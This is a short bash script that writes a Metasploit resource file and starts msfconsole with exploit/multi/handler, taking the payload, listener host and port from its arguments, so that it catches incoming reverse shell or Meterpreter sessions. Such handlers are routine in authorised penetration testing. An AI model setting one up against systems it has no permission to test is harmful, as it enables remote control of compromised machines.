#!/bin/bash

if [ -f multi.rc ];then rm multi.rc; else touch multi.rc;fi
echo use exploit/multi/handler >> multi.rc
echo set PAYLOAD $1 >> multi.rc
echo set LHOST $2 >> multi.rc
echo set LPORT $3 >> multi.rc
echo set ExitOnSession false >> multi.rc
echo exploit >> multi.rc
service postgresql start
msfconsole -r multi.rc